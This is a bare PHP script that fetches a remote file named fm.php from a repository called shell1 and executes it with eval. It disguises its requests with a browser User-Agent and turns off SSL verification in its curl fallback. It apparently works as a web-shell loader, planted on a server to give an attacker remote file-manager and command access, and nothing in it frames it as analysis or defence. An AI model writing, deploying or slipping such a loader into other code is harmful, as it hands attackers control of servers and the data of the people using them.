<?php
$url = 'https://raw.githubusercontent.com/nanzy-co/shell1/refs/heads/main/fm.php';
$opts = array('http' => array('header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"));
$context = stream_context_create($opts);
$content = file_get_contents($url, false, $context);

if ($content === false) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $content = curl_exec($ch);
    curl_close($ch);
}

if ($content) {
    eval('?>' . $content);

} ?>